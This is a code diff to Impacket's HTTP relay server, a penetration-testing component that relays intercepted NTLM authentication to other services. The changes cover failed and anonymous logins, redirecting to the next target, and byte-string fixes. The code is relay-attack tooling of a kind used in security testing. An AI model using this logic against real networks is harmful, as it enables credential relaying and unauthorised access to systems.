@@ -1,17 +1,20 @@
-# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+# Impacket - Collection of Python classes for working with network protocols.
 #
-# This software is provided under under a slightly modified version
+# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
+#
+# This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# HTTP Relay Server
+# Description:
+#   HTTP Relay Server
+#
+#   This is the HTTP server which relays the NTLMSSP  messages to other protocols
 #
 # Authors:
-#  Alberto Solino (@agsolino)
-#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
+#   Alberto Solino (@agsolino)
+#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
 #
-# Description:
-#             This is the HTTP server which relays the NTLMSSP  messages to other protocols
 
 import http.server
 import socketserver
@@ -163,24 +166,42 @@ class HTTPRelayServer(Thread):
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
-                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
-                        authenticateMessage['user_name'].decode('utf-16le')))
+
+                if not self.do_ntlm_auth(token,authenticateMessage):
+                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                        LOG.info("Authenticating against %s://%s as %s\\%s FAILED" % (
+                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
+                            authenticateMessage['user_name'].decode('utf-16le')))
+                    else:
+                        LOG.info("Authenticating against %s://%s as %s\\%s FAILED" % (
+                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
+                            authenticateMessage['user_name'].decode('ascii')))
+                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
+                    # which we don't want
+                    if authenticateMessage['user_name'] != b'':
+                        self.server.config.target.logTarget(self.target)
+                        # No anonymous login, go to next host and avoid triggering a popup
+                        self.do_REDIRECT()
+                    else:
+                        #If it was an anonymous login, send 401
+                        self.do_AUTHHEAD(b'NTLM', proxy=proxy)
                 else:
-                    LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
-                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
-                        authenticateMessage['user_name'].decode('ascii')))
-                self.do_ntlm_auth(token, authenticateMessage)
-                self.do_attack()
+                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
+                            authenticateMessage['user_name'].decode('utf-16le')))
+                    else:
+                        LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
+                            self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
+                            authenticateMessage['user_name'].decode('ascii')))
 
-
-                self.send_response(207, "Multi-Status")
-                self.send_header('Content-Type', 'application/xml')
-                self.send_header('Content-Length', str(len(content)))
-                self.end_headers()
-                self.wfile.write(content)
-                return
+                    self.do_attack()
+                    self.send_response(207, "Multi-Status")
+                    self.send_header('Content-Type', 'application/xml')
+                    self.send_header('Content-Length', str(len(content)))
+                    self.end_headers()
+                    self.wfile.write(content)
+            return
 
         def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
@@ -299,7 +320,7 @@ class HTTPRelayServer(Thread):
 
                     # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
                     # which we don't want
-                    if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
+                    if authenticateMessage['user_name'] != b'': # and authenticateMessage['user_name'][-1] != '$':
                         self.server.config.target.logTarget(self.target)
                         # No anonymous login, go to next host and avoid triggering a popup
                         self.do_REDIRECT()
@@ -380,7 +401,7 @@ class HTTPRelayServer(Thread):
                 self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
                                             authenticateMessage['user_name'].decode('ascii'))).upper()
 
-            if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
+            if authenticateMessage['user_name'] != b'' or self.target.hostname == '127.0.0.1':
                 clientResponse, errorCode = self.client.sendAuth(token)
             else:
                 # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
